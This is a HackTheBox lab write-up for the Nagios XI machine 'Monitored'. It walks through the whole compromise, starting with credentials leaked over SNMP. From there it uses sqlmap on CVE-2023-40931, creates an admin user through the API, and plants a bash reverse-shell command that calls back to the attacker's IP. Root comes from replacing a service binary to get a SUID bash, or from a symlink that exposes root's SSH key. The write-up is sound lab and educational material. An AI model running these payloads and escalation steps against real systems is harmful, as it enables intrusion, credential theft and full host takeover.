# HTB: Monitored

## Overview

Monitored is a HackTheBox machine centered around a Nagios XI monitoring system. The attack path involves multiple privilege escalation vectors, starting from SNMP enumeration and culminating in root access through Nagios service manipulation. The target machine IP is **10.129.230.96** and attacking machine IP is **10.10.15.146**.

## Reconnaissance

### Nmap Scan

Initial port scanning reveals five open TCP ports:

```bash
nmap -p- --min-rate 10000 10.129.230.96
```

**Open Ports:**
- **22/tcp** - SSH (OpenSSH 8.4p1 Debian 5+deb11u3)
- **80/tcp** - HTTP (Apache httpd 2.4.56, redirects to HTTPS)
- **389/tcp** - LDAP (OpenLDAP 2.2.X - 2.3.X)
- **443/tcp** - HTTPS (Apache httpd 2.4.56, Nagios XI)
- **5667/tcp** - Unknown service (tcpwrapped)

The SSL certificate reveals the hostname `nagios.monitored.htb`. UDP scanning also shows SNMP (161/udp) and NTP (123/udp) open:

```bash
nmap -sU -p- --min-rate 10000 --open 10.129.230.96
```

### SNMP Enumeration

SNMP is accessible with the public community string. Dumping the full SNMP data reveals a critical piece of information:

```bash
snmpwalk -v 2c -c public 10.129.230.96 | tee snmp_data
```

Among the running processes, a `sudo` command is visible with credentials:

```
HOST-RESOURCES-MIB::hrSWRunParameters.1312 = STRING: "-u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB"
```

This provides a username (`svc`) and a password (`XjH7VCehowpR1xZB`) for the Nagios system.

### Web Enumeration

The HTTPS site hosts Nagios XI. The login page at `/nagiosxi/login.php` accepts credentials but the `svc` account appears disabled. Attempting to login with the discovered credentials returns a different error message than invalid credentials, confirming the username is valid but the account is inactive.

## Initial Access - Shell as nagios

### API Authentication Bypass

The Nagios XI API is located at `/nagiosxi/api/v1/`. Fuzzing reveals the `authenticate` endpoint:

```bash
feroxbuster -u https://nagios.monitored.htb/nagiosxi/api -m GET,POST -k
```

The endpoint accepts POST requests with username/password:

```bash
curl -X POST -k 'https://nagios.monitored.htb/nagiosxi/api/v1/authenticate' -d "username=svc&password=XjH7VCehowpR1xZB"
```

This returns a valid token. Using this token as a GET parameter on the main page authenticates the session:

```
https://nagios.monitored.htb/nagiosxi/?token=[TOKEN]
```

### SQL Injection - CVE-2023-40931

With authenticated access, the `svc` user's API key can be viewed in account settings. However, to get administrator access, a SQL injection vulnerability (CVE-2023-40931) in `/nagiosxi/admin/banner_message-ajaxhelper.php` is exploited.

The vulnerability exists in the `id` POST parameter. Using `sqlmap` to enumerate the database:

```bash
sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php" --data="id=3&action=acknowledge_banner_message" -p id --cookie "nagiosxi=[COOKIE]" --batch --threads 10 -D nagiosxi -T xi_users --dump
```

The `xi_users` table contains two users:
- **nagiosadmin** (enabled) - Administrator account
- **svc** (disabled) - Service account

The administrator's API key is extracted from the database.

### Administrative Access

Using the admin API key, a new administrative user can be created:

```bash
curl -d "username=0xdf&password=0xdf0xdf&name=0xdf&email=0xdf@monitored.htb&auth_level=admin&force_pw_change=0" -k 'https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=[ADMIN_API_KEY]'
```

This creates an admin user that can log into the Nagios XI web interface.

### Command Execution

From the Nagios admin panel:
1. Navigate to **Configure → Core Config Manager → Commands**
2. Add a new command with a reverse shell payload:
   ```
   /bin/bash -c 'bash -i >& /dev/tcp/10.10.15.146/443 0>&1'
   ```
3. Go to **Hosts → localhost** and set the check command to the newly created shell command
4. Click **Run Check Command** to execute

This triggers a reverse shell as the `nagios` user:

```bash
nc -lnvp 443
```

## Privilege Escalation to Root

### Enumeration

Checking sudo privileges reveals extensive permissions:

```bash
sudo -l
```

The `nagios` user can run numerous scripts as root without password, including:
- `/etc/init.d/nagios` (start/stop/restart/reload/status/checkconfig)
- `/etc/init.d/npcd` (start/stop/restart/reload/status)
- `/usr/local/nagiosxi/scripts/manage_services.sh *`
- `/usr/local/nagiosxi/scripts/components/getprofile.sh`
- And various other scripts

### Method 1: Nagios Service Hijacking

The `manage_services.sh` script is used to manage system services. Checking the service binaries reveals that `/usr/local/nagios/bin/nagios` is owned by the `nagios` user:

```bash
ls -l /usr/local/nagios/bin/nagios
# -rwxrwxr-- 1 nagios nagios 717648 Nov 9 10:40 /usr/local/nagios/bin/nagios
```

Since the `nagios` user has write permissions to this binary, and can restart the service as root, this creates a privilege escalation vector:

1. Back up the original binary:
   ```bash
   mv /usr/local/nagios/bin/nagios /usr/local/nagios/bin/nagios.bk
   ```

2. Create a payload script:
   ```bash
   echo '#!/bin/bash' > /tmp/x.sh
   echo 'cp /bin/bash /tmp/0xdf' >> /tmp/x.sh
   echo 'chown root:root /tmp/0xdf' >> /tmp/x.sh
   echo 'chmod 6777 /tmp/0xdf' >> /tmp/x.sh
   ```

3. Replace the binary with the payload:
   ```bash
   cp /tmp/x.sh /usr/local/nagios/bin/nagios
   chmod +x /usr/local/nagios/bin/nagios
   ```

4. Restart the service (which executes the payload as root):
   ```bash
   sudo /usr/local/nagiosxi/scripts/manage_services.sh restart nagios
   ```

5. Execute the SUID binary for a root shell:
   ```bash
   /tmp/0xdf -p
   ```

### Method 2: Profile Script Abuse

The `getprofile.sh` script creates archives of system logs for debugging purposes. One of the files it reads, `/usr/local/nagiosxi/tmp/phpmailer.log`, is writable by the `nagios` user.

Create a symlink pointing to root's SSH private key:

```bash
ln -sf /root/.ssh/id_rsa /usr/local/nagiosxi/tmp/phpmailer.log
```

Run the profile script as root:

```bash
sudo /usr/local/nagiosxi/scripts/components/getprofile.sh 0xdf
```

The resulting ZIP archive (`/usr/local/nagiosxi/var/components/profile.zip`) contains the symlinked file's content. Extract the root SSH private key:

```bash
unzip -p profile.zip *phpmailer.log
```

Use the key to SSH directly as root:

```bash
ssh -i root_key root@10.129.230.96
```

## Flags

- **User Flag**: `a81be4e9************************`
- **Root Flag**: `74cc1c60************************`

## Summary

This machine demonstrates a multi-stage attack path:
1. **Information Disclosure**: SNMP leaking credentials
2. **Authentication Bypass**: API token generation
3. **SQL Injection**: CVE-2023-40931 to extract admin API keys
4. **Admin Account Creation**: API user creation to gain web access
5. **Command Execution**: Nagios configuration to get reverse shell
6. **Privilege Escalation**: Service binary hijacking and symlink abuse

The machine highlights common misconfigurations in monitoring systems, including insecure SNMP defaults, API design flaws, and dangerous sudo permissions that allow privilege escalation.
